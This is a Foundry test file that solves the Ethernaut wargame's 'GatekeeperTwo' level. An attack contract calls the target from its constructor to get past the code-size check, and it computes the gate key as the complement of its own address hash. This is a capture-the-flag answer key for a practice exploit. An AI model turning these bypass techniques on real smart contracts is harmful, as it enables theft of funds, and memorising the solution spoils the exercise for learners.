// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/14-GatekeeperTwo/GatekeeperTwo.sol";
import "../src/levels/14-GatekeeperTwo/GatekeeperTwoFactory.sol";

// run the test with --sender 0x0000000000000000000000000000000000000001 to set correct tx.origin
contract GatekeeperTwoTest is Test {
    Ethernaut public ethernaut;
    GatekeeperTwoFactory public gatekeeperTwoFactory;
    GatekeeperTwoAttack public gatekeeperTwoAttack;
    GatekeeperTwo public gatekeeperTwo;
    address internal levelAddr;

    address eoa1 = address(0x1);

    function setUp() public {
        ethernaut = new Ethernaut();
        gatekeeperTwoFactory = new GatekeeperTwoFactory();
        ethernaut.registerLevel(gatekeeperTwoFactory);

        vm.startPrank(eoa1);
        vm.deal(eoa1, 10_000 ether);

        levelAddr = ethernaut.createLevelInstance{value: 1 ether}(
            gatekeeperTwoFactory
        );
        gatekeeperTwo = GatekeeperTwo(payable(levelAddr));
    }

    function testAttack() public {
        new GatekeeperTwoAttack(gatekeeperTwo);

        bool success = ethernaut.submitLevelInstance(payable(levelAddr));
        assertTrue(success, "Solution is not solving the level");
    }
}

contract GatekeeperTwoAttack {
    constructor(GatekeeperTwo _gatekeeperTwo) payable {
        _gatekeeperTwo.enter(_getGateKey());
    }

    function _getGateKey() internal view returns (bytes8) {
        uint64 addrAsUint64 = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        uint64 maxUint64 = type(uint64).max;
        uint64 mask = maxUint64 - addrAsUint64;
        return bytes8(mask);
    }
}
